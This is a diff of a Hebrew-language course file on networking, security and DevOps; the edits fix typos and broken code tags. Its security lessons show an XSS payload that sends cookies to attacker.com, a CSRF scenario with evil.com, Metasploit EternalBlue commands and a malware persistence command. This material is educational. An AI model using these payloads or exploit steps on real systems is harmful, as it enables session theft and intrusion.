@@ -3936,7 +3936,7 @@ vs. Python/Java thread: 8-512MB per thread
           <p>ספקית האינטרנט שלך רואה <strong>כל</strong> DNS query שלך — גם אחרי שעברת ל-HTTPS. מדוע?</p>
           <ul>
             <li>HTTPS מצפין <em>תוכן</em> — לא את שם הדומיין</li>
-            <li>DNS query: "מה ה-IP של pornhub.com?" — נשלח בflat text לשרת DNS (בדרך כלל של ה-ISP) ללא הצפנה</li>
+            <li>DNS query: "מה ה-IP של pornhub.com?" — נשלח ב-plain text לשרת DNS (בדרך כלל של ה-ISP) ללא הצפנה</li>
             <li>TLS SNI (Server Name Indication): בחיבור HTTPS — שם הדומיין נשלח בclear text כחלק מה-TLS Handshake הראשוני</li>
           </ul>
           <div class="code-preview">
@@ -3971,7 +3971,7 @@ IP address: 142.250.80.101 [גלוי]
             <li><strong>Audio context:</strong> כיצד הדפדפן מעבד audio — ייחודי לhardware</li>
           </ul>
           <div class="code-preview">
-            <pre><code">// Canvas fingerprinting — איך זה עובד:
+            <pre><code>// Canvas fingerprinting — איך זה עובד:
 const canvas = document.createElement('canvas')
 const ctx = canvas.getContext('2d')
 ctx.font = '18px Arial'
@@ -3980,7 +3980,7 @@ ctx.fillText('Hello, World! 🌍', 10, 50)
 const fingerprint = canvas.toDataURL()
 // → hash ייחודי ≈ 99% ייחודיות</code></pre>
           </div>
-          <p><strong>הנתון המבהיל:</strong> EFF's Panopticlick מצא שצירוף הפרמטרים הוא ייחודי ל-~1 מ-286,777 דפדפנים. אתה כמעט בלתי ניתן לזיהוי-שגוי.</p>
+          <p><strong>הנתון המבהיל:</strong> EFF's Panopticlick מצא שצירוף הפרמטרים הוא ייחודי ל-~1 מ-286,777 דפדפנים. את כמעט בלתי ניתנת לזיהוי שגוי.</p>
           <p><strong>הגנה:</strong> Tor Browser randomizes fingerprint. Firefox Resist Fingerprinting mode. אחרת — קשה מאוד.</p>
         `
       },
@@ -4077,7 +4077,7 @@ const fingerprint = canvas.toDataURL()
           {
             title: "Metadata גרוע יותר מ-Content",
             icon: "📊",
-            content: `<p>"We kill people based on metadata" — Michael Hayden, ראש NSA לשעבר. Metadata = מי דיבר עם מי, מתי, ממה מיקום. לא תוכן השיחה. מ-metadata בלבד ניתן להסיק: יחסים, בריאות (שיחות לרופא), פוליטיקה, דת. HTTPS מסתיר content — לא metadata.</p>`
+            content: `<p>"We kill people based on metadata" — Michael Hayden, ראש NSA לשעבר. Metadata = מי דיבר עם מי, מתי, מאיזה מיקום. לא תוכן השיחה. מ-metadata בלבד ניתן להסיק: יחסים, בריאות (שיחות לרופא), פוליטיקה, דת. HTTPS מסתיר content — לא metadata.</p>`
           }
         ]
       },
@@ -4151,7 +4151,7 @@ const fingerprint = canvas.toDataURL()
               <text x="272" y="82" text-anchor="middle" font-size="8" fill="#065f46">→ 0-1 round trips</text>
             </svg>
           </div>
-          <p><strong>0-RTT:</strong> אם כבר שוחחת עם שרת — QUIC שומר session ticket. בבקשה הבאה, שולח נתונים כבר ב-packet הראשון. פותח דף web לפני TCP אפילו יצר חיבור.</p>
+          <p><strong>0-RTT:</strong> אם כבר שוחחת עם שרת — QUIC שומר session ticket. בבקשה הבאה, שולח נתונים כבר ב-packet הראשון. פותח דף web לפני ש-TCP בכלל יצר חיבור.</p>
         `
       },
       {
@@ -4159,11 +4159,11 @@ const fingerprint = canvas.toDataURL()
         title: "eBPF – תכנות ה-Kernel ללא תכנות Kernel",
         content: `
           <p><strong>eBPF</strong> (extended Berkeley Packet Filter) — אחד מהשינויים המהפכניים ביותר ב-Linux בעשור האחרון. מאפשר להריץ קוד <strong>בתוך</strong> Linux kernel — בלי לכתוב kernel module, בלי reboot, בבטיחות מוחלטת.</p>
-          <p><strong>הרעיון:</strong> BPF ישן (1992) — סינון packets ב-tcpdump. eBPF (2014+) — JIT-compiled bytecode שרץ ב-kernel בcontext של event: network packet, syscall, function call, timer.</p>
+          <p><strong>הרעיון:</strong> BPF ישן (1992) — סינון packets ב-tcpdump. eBPF (2014+) — JIT-compiled bytecode שרץ ב-kernel ב-context של event: network packet, syscall, function call, timer.</p>
           <p><strong>למה זה מהפכני לרשתות:</strong></p>
           <ul>
             <li><strong>XDP (eXpress Data Path):</strong> עיבוד packet <em>לפני</em> ה-kernel network stack — מיליוני pps</li>
-            <li><strong>Cilium:</strong> CNI לKubernetes שמחליף iptables בeBPF. תוצאה: 10x ביצועים, monitoring מובנה</li>
+            <li><strong>Cilium:</strong> CNI ל-Kubernetes שמחליף iptables בeBPF. תוצאה: 10x ביצועים, monitoring מובנה</li>
             <li><strong>Cloudflare:</strong> DDoS mitigation שלהם רץ על eBPF/XDP — drop ב-line-rate ב-wire</li>
           </ul>
           <div class="code-preview">
@@ -4192,7 +4192,7 @@ int block_udp(struct xdp_md *ctx) {
           <table class="content-table">
             <tr><th></th><th>GEO (35,786km)</th><th>LEO (550km)</th></tr>
             <tr><td>Latency</td><td>600ms+ RTT</td><td>20-40ms RTT</td></tr>
-            <tr><td>לווינים נדרשים</td><td>3 מכסים את כל כדור הארץ</td><td>אלפים (תמיד עצים)</td></tr>
+            <tr><td>לווינים נדרשים</td><td>3 מכסים את כל כדור הארץ</td><td>אלפים (תמיד נעים מעל)</td></tr>
             <tr><td>bandwidth per user</td><td>נמוך יחסית</td><td>50-200 Mbps</td></tr>
             <tr><td>גישה לאזורים נידחים</td><td>✓</td><td>✓</td></tr>
           </table>
@@ -4220,7 +4220,7 @@ int block_udp(struct xdp_md *ctx) {
       },
       {
         type: "explanation",
-        title: "Service Mesh ו-Zero Trust בEnterprises",
+        title: "Service Mesh ו-Zero Trust ב-Enterprises",
         content: `
           <p>בעולם ה-microservices — לא מספיק לאבטח את ה-perimeter. כל service צריך לאמת כל request. זה <strong>Service Mesh</strong>.</p>
           <p><strong>sidecar proxy pattern:</strong></p>
@@ -4249,7 +4249,7 @@ spec:
     interval: 30s
     baseEjectionTime: 30s  # circuit breaker</code></pre>
           </div>
-          <p><strong>Circuit Breaker pattern:</strong> אם service מחזיר errors — הmesh מפסיק לשלוח אליו ומחכה לrecovery. מונע cascading failures.</p>
+          <p><strong>Circuit Breaker pattern:</strong> אם service מחזיר errors — הmesh מפסיק לשלוח אליו ומחכה ל-recovery. מונע cascading failures.</p>
           <p><strong>Zero Trust שמשולב עם Service Mesh:</strong> כל service מחזיקה certificate, כל request נאמת, policy מנוהל centrally. אפילו attacker בתוך cluster לא יכול לנוע laterally בקלות.</p>
         `
       },
@@ -4261,10 +4261,10 @@ spec:
           {
             title: "eBPF = מחליף iptables, routing, ועוד",
             icon: "🔧",
-            content: `<p>iptables — הכלי שניהל את firewalls של Linux מ-1998 — מיועד לפנסיה. Cilium + eBPF מחליפים אותו בKubernetes. Meta מריצה <strong>Katran</strong> (load balancer מבוסס eBPF) שמטפל במאות מיליוני חיבורים. eBPF מאפשר observability שלא היה אפשרי — trace כל syscall בproduction בלי overhead. זה ה-TCP/IP של הדור הבא.</p>`
+            content: `<p>iptables — הכלי שניהל את firewalls של Linux מ-1998 — מיועד לפנסיה. Cilium + eBPF מחליפים אותו בKubernetes. Meta מריצה <strong>Katran</strong> (load balancer מבוסס eBPF) שמטפל במאות מיליוני חיבורים. eBPF מאפשר observability שלא היה אפשרי — trace כל syscall ב-production בלי overhead. זה ה-TCP/IP של הדור הבא.</p>`
           },
           {
-            title: "האינטרנט של האינטרנט של הדברים",
+            title: "האינטרנט של הדברים",
             icon: "📡",
             content: `<p>IPv6 נוצר ל-2^128 כתובות — מספיק לכל אטום על פני כדור הארץ פי מיליון. IoT = ≈15 מיליארד מכשירים מחוברים ב-2024, ≈30B ב-2030. כל מקרר, מנורה, חיישן — IP משלו. Thread (Matter), Zigbee, LoRaWAN — פרוטוקולי mesh networking למכשירים קטנים. הרשת עוברת מחיבור <em>מחשבים</em> לחיבור <em>עולם פיזי</em>.</p>`
           }
@@ -4296,7 +4296,7 @@ spec:
           },
           {
             q: "למה eBPF מהפכני לאבטחת רשתות?",
-            a: "eBPF מריץ קוד בתוך kernel ב-XDP context — לפני שהpacket מגיע לnetwork stack. זה מאפשר drop/filter ב-line rate של hardware (מיליוני pps). קוד דינמי שניתן לעדכן בלי reboot. Cloudflare משתמשת בזה לDDoS mitigation. בנוסף — full observability של כל syscall בproduction ללא overhead."
+            a: "eBPF מריץ קוד בתוך kernel ב-XDP context — לפני שהpacket מגיע לnetwork stack. זה מאפשר drop/filter ב-line rate של hardware (מיליוני pps). קוד דינמי שניתן לעדכן בלי reboot. Cloudflare משתמשת בזה לDDoS mitigation. בנוסף — full observability של כל syscall ב-production ללא overhead."
           },
           {
             q: "מה בעיית HOL Blocking ב-TCP ואיך QUIC פותר אותה?",
@@ -4640,7 +4640,7 @@ nmap -sU -p 53,161,500 192.168.1.1</code></pre></div>
 # Scanner (Pro) — automatic vulnerability scan
 # Decoder — base64, URL encode/decode</code></pre></div>
 <h3>Metasploit — Framework לExploitation</h3>
-<div class="code-preview"><pre><code">msfconsole
+<div class="code-preview"><pre><code>msfconsole
 search ms17-010          # EternalBlue
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.1.5
@@ -4719,7 +4719,7 @@ run</code></pre></div>
 <li><strong>Recovery:</strong> Restore from clean backup, monitor closely</li>
 <li><strong>Lessons Learned:</strong> Post-mortem, update playbooks, train team</li>
 </ol>
-<div class="code-preview"><pre><code"># Splunk — hunting lateral movement
+<div class="code-preview"><pre><code># Splunk — hunting lateral movement
 index=windows EventCode=4624
   LogonType=3 NOT (src_ip="127.0.0.1")
 | stats count by src_ip, dest_ip, user
@@ -4786,7 +4786,7 @@ index=windows EventCode=4624
   <tr><td>HackerOne</td><td>Google, Apple, Microsoft, US DoD</td><td>$100 — $100,000+</td></tr>
   <tr><td>Bugcrowd</td><td>Tesla, Mastercard, Atlassian</td><td>$50 — $50,000</td></tr>
   <tr><td>Intigriti</td><td>חברות אירופיות, NATO</td><td>€100 — €20,000</td></tr>
-  <tr><td>Synack</td><td>invitaton-only, US Gov</td><td>גבוה מאוד</td></tr>
+  <tr><td>Synack</td><td>invitation-only, US Gov</td><td>גבוה מאוד</td></tr>
 </table>
 <h3>Vulnerability Classifications ותשלומים</h3>
 <ul>
@@ -4996,7 +4996,7 @@ print(plaintext)  # b'secret message'</code></pre>
 <p>Social Engineering לא מסתכם במיילים. כל ערוץ תקשורת הוא וקטור תקיפה:</p>
 <table class="content-table">
   <tr><th>שם</th><th>ערוץ</th><th>דוגמה</th><th>הגנה</th></tr>
-  <tr><td><strong>Vishing</strong></td><td>שיחת טלפון</td><td>"בנק לאומי — נחסמה הכרטיס שלך"</td><td>נתק וחזור לנהר הרשמי</td></tr>
+  <tr><td><strong>Vishing</strong></td><td>שיחת טלפון</td><td>"בנק לאומי — נחסמה הכרטיס שלך"</td><td>נתק וחזור למספר הרשמי</td></tr>
   <tr><td><strong>Smishing</strong></td><td>SMS</td><td>"חבילה ממתינה — לחץ לאימות"</td><td>אל תלחץ על קישורי SMS</td></tr>
   <tr><td><strong>Pretexting</strong></td><td>כל ערוץ</td><td>מתחזה לIT support</td><td>אמת זהות בצינור נפרד</td></tr>
   <tr><td><strong>Baiting</strong></td><td>פיזי</td><td>USB drive שנמצא בחניה</td><td>אל תחבר מדיה לא מוכרת</td></tr>
@@ -5290,7 +5290,7 @@ ps.setString(2, password);</code></pre></div>
   <tr><td><strong>DOM-based</strong></td><td>ב-JavaScript</td><td>Payload ב-fragment/location → DOM manipulation</td></tr>
 </table>
 <h3>Payload קלאסי — Cookie Theft</h3>
-<div class="code-preview"><pre><code"># Reflected XSS — ב-URL
+<div class="code-preview"><pre><code># Reflected XSS — ב-URL
 https://site.com/search?q=<script>document.location='http://attacker.com/?c='+document.cookie</script>
 
 # Stored XSS — בשדה תגובה
@@ -5463,7 +5463,7 @@ Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report<
         content: `<div dir="rtl">
 <h2>CSRF — גרימת בקשות ממקור זדוני</h2>
 <p>CSRF מנצלת את העובדה שהדפדפן שולח cookies אוטומטית עם כל בקשה. אתר זדוני יכול לגרום לדפדפן של הקורבן לשלוח בקשה לאתר שבו הוא מחובר.</p>
-<div class="code-preview"><pre><code"># תרחיש:
+<div class="code-preview"><pre><code># תרחיש:
 # 1. Alice מחוברת ל-bank.com (cookie session בדפדפן)
 # 2. Alice ביקרה ב-evil.com
 # 3. evil.com מכיל:
@@ -5637,7 +5637,7 @@ Get-ScheduledTask | Where-Object State -eq 'Ready'  # scheduled tasks</code></pr
 <li><strong>Software Supply Chain</strong> — ה-update הרגיל הוא וקטור תקיפה</li>
 <li><strong>Code Signing</strong> — חתימה לא מספיקה אם CI/CD נפרץ</li>
 <li><strong>Zero Trust</strong> — גם software "מאמין" צריך לפעול עם minimal privilege</li>
-<li><strong>Network segmentation</strong> — מנעה ממנה לנוע laterally</li>
+<li><strong>Network segmentation</strong> — היתה אמורה למנוע תנועה laterally</li>
 <li>גורם ייחוס: ממשלת ארה"ב — רוסיה (SVR)</li>
 </ul>
 </div>`
@@ -5702,7 +5702,7 @@ objdump -d malware.exe | head -100  # disassembly
 <h2>Persistence — איך Malware שורד Reboot</h2>
 <p>Malware מחפש דרך לרוץ גם אחרי reboot. הכרת מנגנוני Persistence חיונית לאנשי IR לאיתור ונקיון.</p>
 <h3>Windows Persistence</h3>
-<div class="code-preview"><pre><code"># Registry Run Keys (הנפוצות ביותר)
+<div class="code-preview"><pre><code># Registry Run Keys (הנפוצות ביותר)
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 # Malware מוסיף value → רץ עם כל login
@@ -5719,7 +5719,7 @@ sc create "WinHelper" binpath= "C:\malware.exe" start= auto
 # Startup Folder
 C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</code></pre></div>
 <h3>Linux Persistence</h3>
-<div class="code-preview"><pre><code"># Cron jobs
+<div class="code-preview"><pre><code># Cron jobs
 crontab -l              # של המשתמש הנוכחי
 cat /etc/crontab        # System-wide
 ls /etc/cron.d/         # Drop-in cron files
@@ -6579,7 +6579,7 @@ terraform init    # הורדת providers
 terraform plan    # תצוגה מקדימה — מה ישתנה?
 terraform apply   # ביצוע השינויים
 terraform destroy # הריסה מבוקרת</code></pre></div>
-<p><strong>State file:</strong> Terraform שומר <code>terraform.tfstate</code> עם המצב הנוכחי. בצוות — שמרים ב-S3 עם DynamoDB לocking.</p>
+<p><strong>State file:</strong> Terraform שומר <code>terraform.tfstate</code> עם המצב הנוכחי. בצוות — שומרים ב-S3 עם DynamoDB locking.</p>
 </div>`
       },
       {
@@ -6627,7 +6627,7 @@ terraform destroy # הריסה מבוקרת</code></pre></div>
     service:
       name: nginx
       state: restarted</code></pre></div>
-<div class="code-preview"><pre><code"># inventory — רשימת שרתים
+<div class="code-preview"><pre><code># inventory — רשימת שרתים
 [webservers]
 web1.example.com
 web2.example.com
@@ -6686,8 +6686,8 @@ ansible-playbook -i inventory playbook.yml</code></pre></div>
         title: "Prometheus + Grafana",
         content: `<div dir="rtl">
 <h2>המחסנית הסטנדרטית לניטור</h2>
-<p>Prometheus אוסף מדדים בformatting מוגדר (scraping). Grafana מציגה dashboards. AlertManager שולח התראות.</p>
-<div class="code-preview"><pre><code"># prometheus.yml — הגדרת scraping
+<p>Prometheus אוסף מדדים בפורמט מוגדר (scraping). Grafana מציגה dashboards. AlertManager שולח התראות.</p>
+<div class="code-preview"><pre><code># prometheus.yml — הגדרת scraping
 global:
   scrape_interval: 15s
 
@@ -6713,7 +6713,7 @@ groups:
       severity: critical
     annotations:
       summary: "שגיאות מעל 5% מהבקשות"</code></pre></div>
-<div class="code-preview"><pre><code"># Python — חשיפת metrics לPrometheus
+<div class="code-preview"><pre><code># Python — חשיפת metrics לPrometheus
 from prometheus_client import Counter, Histogram, start_http_server
 
 REQUEST_COUNT = Counter('http_requests_total',
@@ -6745,7 +6745,7 @@ async def metrics_middleware(request, call_next):
 </table>
 <p><strong>Error Budget — הרעיון המפתח:</strong> SLO של 99.9% = 0.1% error budget לחודש. אם השתמשנו ב-50% מהתקציב → אפשר לדפלוי בזהירות. אם ניצלנו 100% → אסור לדפלוי עד שמשקמים.</p>
 <p>זה פותר את המתח Dev-Ops: שניהם עובדים עם אותו budget. Dev רוצה לדפלוי → צריך לשמור error budget. Ops לא "חוסם" — ה-math עושה את זה.</p>
-<div class="code-preview"><pre><code"># חישוב Error Budget
+<div class="code-preview"><pre><code># חישוב Error Budget
 slo = 99.9  # %
 minutes_per_month = 30 * 24 * 60  # = 43,200 דקות
 error_budget_minutes = minutes_per_month * (100 - slo) / 100
@@ -6853,7 +6853,7 @@ terraform {
   }
 }</code></pre>
 <p><strong>הכלל החשוב ביותר:</strong> לעולם אל תערכו state ידנית. אם משאב נוצר מחוץ ל-Terraform (click בconsole) — השתמשו ב-<code>terraform import</code> כדי להכניס אותו ל-state.</p>
-<p><strong>Remote state:</strong> בצוות, state חייב להיות בS3 + DynamoDB לocking, לא על המחשב האישי. אחרת שני אנשים שמריצים <code>apply</code> במקביל יגרמו corruption.</p>
+<p><strong>Remote state:</strong> בצוות, state חייב להיות ב-S3 + DynamoDB locking, לא על המחשב האישי. אחרת שני אנשים שמריצים <code>apply</code> במקביל יגרמו corruption.</p>
 </div>`
       },
       {
@@ -6992,7 +6992,7 @@ ALERT HighErrorRate
       },
       {
         type: "diagram",
-        title: "GitOps Loop — מGit לKubernetes",
+        title: "GitOps Loop — מGit ל-Kubernetes",
         content: `<div dir="rtl">
 <h2>ArgoCD — GitOps Controller</h2>
 <div class="diagram-container">
@@ -7108,10 +7108,10 @@ argocd app rollback my-app 3</code></pre>
 </div>
 <table class="content-table">
   <tr><th>State</th><th>משמעות</th><th>מה לחפש</th></tr>
-  <tr><td><code>SYN_SENT</code></td><td>לקוח שלח SYN, מחכה לתגובה</td><td>אם נתקע — הסרת/firewall חסום</td></tr>
+  <tr><td><code>SYN_SENT</code></td><td>לקוח שלח SYN, מחכה לתגובה</td><td>אם נתקע — השרת/firewall חוסם</td></tr>
   <tr><td><code>ESTABLISHED</code></td><td>חיבור פעיל, נתונים זורמים</td><td>RTT, window size, retransmissions</td></tr>
   <tr><td><code>TIME_WAIT</code></td><td>חיבור נסגר, ממתין 2×MSL</td><td>המון TIME_WAIT = בעיית port exhaustion</td></tr>
-  <tr><td><code>CLOSE_WAIT</code></td><td>הצד הרחוק סגר, צד שלנו לא</td><td>bug ב-application — לא מסגר socket</td></tr>
+  <tr><td><code>CLOSE_WAIT</code></td><td>הצד הרחוק סגר, צד שלנו לא</td><td>bug ב-application — לא סוגר socket</td></tr>
 </table>
 <p><strong>Filter שימושי:</strong> <code>tcp.flags.syn == 1 && tcp.flags.ack == 0</code> — רואה כל ניסיון חיבור חדש.</p>
 </div>`
@@ -7137,7 +7137,7 @@ tcp.analysis.ack_rtt</code></pre></div>
   <tr><td>הרבה Retransmissions</td><td>אובדן חבילות, רשת עמוסה</td><td>בדוק interface errors, שדרג קו</td></tr>
   <tr><td>Zero Window</td><td>Application לא קורא מהיר מספיק</td><td>tune TCP buffers, בדוק CPU</td></tr>
   <tr><td>RTT גבוה בעקביות</td><td>נתיב ארוך, סאטלייט, congestion</td><td>CDN, BBR congestion algorithm</td></tr>
-  <tr><td>Fast Retransmit</td><td>חבילה אחת אבדה, הבאות הגיעו</td><td>בדח מיקום — לרוב בשכבת הפיזי</td></tr>
+  <tr><td>Fast Retransmit</td><td>חבילה אחת אבדה, הבאות הגיעו</td><td>בדוק מיקום — לרוב בשכבה הפיזית</td></tr>
 </table>
 <p><strong>כלי מובנה:</strong> Statistics → TCP Stream Graphs → Time-Sequence Graph מציג את CWND לאורך זמן — drops מופיעים כצניחות חדות.</p>
 </div>`
@@ -7211,7 +7211,7 @@ sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)</code></pre></div>
         title: "Path Selection — 13 הכללים",
         content: `<div dir="rtl">
 <h2>כיצד BGP בוחר את המסלול הטוב ביותר</h2>
-<p>כשהruter מקבל אותו prefix מכמה שכנים, הוא עובר על 13 קריטריונים לפי הסדר — הראשון שמבדיל מנצח:</p>
+<p>כשהrouter מקבל אותו prefix מכמה שכנים, הוא עובר על 13 קריטריונים לפי הסדר — הראשון שמבדיל מנצח:</p>
 <table class="content-table">
   <tr><th>#</th><th>קריטריון</th><th>גבוה = עדיף</th></tr>
   <tr><td>1</td><td>Weight (Cisco proprietary)</td><td>✅ גבוה</td></tr>
@@ -7239,7 +7239,7 @@ route-map BACKUP_LINK permit 10
         title: "הסיפור: Pakistan Telecom 2008",
         content: `<div dir="rtl">
 <h2>כשPakistan תקפה את YouTube — בטעות</h2>
-<p>24 בפברואר 2008: Pakistan Telecom קיבלה הוראה מהממשלה לחסום YouTube. הפתרון שבחרו — להכניס route ל-BGP שמפנה את הtrafic של YouTube לblack hole מקומי.</p>
+<p>24 בפברואר 2008: Pakistan Telecom קיבלה הוראה מהממשלה לחסום YouTube. הפתרון שבחרו — להכניס route ל-BGP שמפנה את הtraffic של YouTube לblack hole מקומי.</p>
 <p><strong>מה שקרה:</strong> במקום לשמור את הroute פנימי (iBGP בלבד), הroute דלף ל-PCCW — ה-upstream ISP של Pakistan. PCCW הפיצה אותו לשאר העולם.</p>
 <p>כרגע שזה קרה: BGP בחר את הroute של Pakistan לכל טראפיק ל-YouTube — כי הוא היה ה-<em>ספציפי יותר</em>. YouTube פרסמה <code>208.65.153.0/22</code>; Pakistan פרסמה <code>208.65.153.0/24</code> — /24 ספציפי יותר מ-/22.</p>
 <p>תוך 2 דקות: 75% מטראפיק YouTube העולמי הופנה לPakistan. YouTube הייתה נגישה רק ל-25% מהמשתמשים. משך ההפסקה: כ-2 שעות.</p>
@@ -7249,7 +7249,7 @@ route-map BACKUP_LINK permit 10
 
 # BGP: Longest Prefix Match תמיד מנצח
 # /24 (256 כתובות) > /22 (1024 כתובות) מבחינת BGP</code></pre></div>
-<p><strong>הלקח:</strong> BGP הוא פרוטוקול של אמון. אין אימות מובנה — כל AS יכול לפרסם כל prefix. RPKI (Resource Public Key Infrastructure) נוצר בדיוק בגלל תקריות כאלו — קריפטוגרפית מאמת שASהוא מורשה לפרסם prefix מסוים.</p>
+<p><strong>הלקח:</strong> BGP הוא פרוטוקול של אמון. אין אימות מובנה — כל AS יכול לפרסם כל prefix. RPKI (Resource Public Key Infrastructure) נוצר בדיוק בגלל תקריות כאלו — קריפטוגרפית מאמתת ש-AS מורשה לפרסם prefix מסוים.</p>
 </div>`
       }
     ]
@@ -7330,7 +7330,7 @@ dig +dnssec cloudflare.com
   <tr><td>DoQ</td><td>853/UDP-QUIC</td><td>✅ QUIC</td><td>✅ מהיר יותר</td></tr>
 </table>
 <h3>Anycast — למה 8.8.8.8 מהיר מכל מקום בעולם</h3>
-<p>Google מפרסמת את 8.8.8.8 מ-dozens of locations עם BGP Anycast. BGP always routes to the "closest" — כך שאתה בישראל מדבר עם datacenter בישראל/אירופה, לא בארה"ב.</p>
+<p>Google מפרסמת את 8.8.8.8 מעשרות מיקומים עם BGP Anycast. BGP תמיד מנתב ל"קרוב ביותר" — כך שאתה בישראל מדבר עם datacenter בישראל/אירופה, לא בארה"ב.</p>
 </div>`
       },
       {
@@ -7426,7 +7426,7 @@ QUIC 0-RTT (חיבור חוזר):
         title: "הסיפור: Google QUIC לפני שהעולם ידע",
         content: `<div dir="rtl">
 <h2>איך Google בנתה QUIC בשקט ואז שינתה את האינטרנט</h2>
-<p>2012: Google שמה לב שTCP הוא bottleneck אמיתי — בעיקר על mobile networks עם packet loss גבוה. הפתרון של IETF יקח שנים. Google החליטה לפתרת לבד.</p>
+<p>2012: Google שמה לב שTCP הוא bottleneck אמיתי — בעיקר על mobile networks עם packet loss גבוה. הפתרון של IETF יקח שנים. Google החליטה לפתור לבד.</p>
 <p>הם בנו QUIC תחילה כexperimental protocol, והפעילו אותו כברירת מחדל ב-Chrome ← Google Servers. המשתמשים לא ידעו — פשוט YouTube וChrome הרגישו מהירים יותר.</p>
 <p>2015: Google פרסמה ש-~50% מבקשות Chrome כבר הולכות על QUIC. הנתונים הראו: חיבורי QUIC מהירים ב-30% ב-tail latency (percentile 99) לעומת TCP.</p>
 <p>2018: Google הגישה QUIC ל-IETF לסטנדרטיזציה. אבל IETF שינתה הרבה — IETF QUIC שונה מGoogle QUIC. 2021: RFC 9000 — QUIC סטנדרטי, HTTP/3 (RFC 9114).</p>
@@ -7465,7 +7465,7 @@ QUIC 0-RTT (חיבור חוזר):
   <text x="300" y="123" text-anchor="middle" font-size="9" fill="#86efac">Socket filter</text>
 </svg>
 </div>
-<p>eBPF programs מוכנסים ל-hooks בגרעין. הgverifier מבטיח שהם לא יגרמו crash, לא ירוצו לנצח, ולא ייגשו לזיכרון לא מורשה.</p>
+<p>eBPF programs מוכנסים ל-hooks בגרעין. הverifier מבטיח שהם לא יגרמו crash, לא ירוצו לנצח, ולא ייגשו לזיכרון לא מורשה.</p>
 <h3>Maps — תקשורת kernel ↔ user space</h3>
 <div class="code-preview"><pre><code>// eBPF program (C)
 struct {
@@ -7671,7 +7671,7 @@ openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -tex
         content: `<div dir="rtl">
 <h2>Pakistan Telecom 2008 — כשהאינטרנט נשבר לשעה</h2>
 <p>פברואר 2008: Pakistan Telecom קיבלה הוראה מממשלה לחסום YouTube. הם הוסיפו route ל-BGP שאמר "אני מגיש את 208.65.153.0/24 (YouTube)". הבעיה: הroute הזה הופץ לכל האינטרנט. במשך שעה, traffic של YouTube מרחבי העולם הגיע ל-Pakistan Telecom — ונעלם.</p>
-<p>הסיבה: BGP מסורתי הוא <strong>trust-based</strong>. כל AS יכול להכריז על כל prefix. אין authentication. מספיק שrenter אחד "טעה" — והEX-PREFIX מגיע לכולם.</p>
+<p>הסיבה: BGP מסורתי הוא <strong>trust-based</strong>. כל AS יכול להכריז על כל prefix. אין authentication. מספיק שrouter אחד "טעה" — והprefix השגוי מגיע לכולם.</p>
 <p><strong>RPKI (Resource Public Key Infrastructure)</strong> היא הפתרון: מאגר cryptographically signed של "מי מורשה להכריז על איזה prefix".</p>
 <pre><code># ROA — Route Origin Authorization
 # "AS 13335 (Cloudflare) מורשה להכריז על 1.1.1.0/24"
@@ -7756,7 +7756,7 @@ ip link set veth0 master docker0
 # הפעלה
 ip netns exec container1 ip link set veth1 up
 ip netns exec container1 ip addr add 172.17.0.2/16 dev veth1</code></pre>
-<p>כל container מקבל <strong>veth pair</strong> — "כבל וירטואלי" שמקשר בין ה-namespace לbrige ה-host. Bridge <code>docker0</code> הוא ה-switch הוירטואלי שמחבר את כל הcontainers.</p>
+<p>כל container מקבל <strong>veth pair</strong> — "כבל וירטואלי" שמקשר בין ה-namespace לbridge של ה-host. Bridge <code>docker0</code> הוא ה-switch הווירטואלי שמחבר את כל הcontainers.</p>
 </div>`
       },
       {
@@ -7797,7 +7797,7 @@ ip netns exec container1 ip addr add 172.17.0.2/16 dev veth1</code></pre>
         content: `<div dir="rtl">
 <h2>Pod-to-Pod: אותו Node vs Cross-Node</h2>
 <p>Kubernetes דורש שכל Pod יוכל לדבר עם כל Pod אחר — ללא NAT. זו ה-<strong>CNI contract</strong> (Container Network Interface).</p>
-<p><strong>אותו node:</strong> persis כמו Docker — veth pairs לbrige. Packets עוברים דרך bridge בL2.</p>
+<p><strong>אותו node:</strong> בדיוק כמו Docker — veth pairs לbridge. Packets עוברים דרך bridge ב-L2.</p>
 <p><strong>Cross-node:</strong> כאן נכנסים CNI plugins:</p>
 <table class="content-table">
   <tr><th>CNI Plugin</th><th>טכנולוגיה</th><th>יתרון</th><th>חיסרון</th></tr>
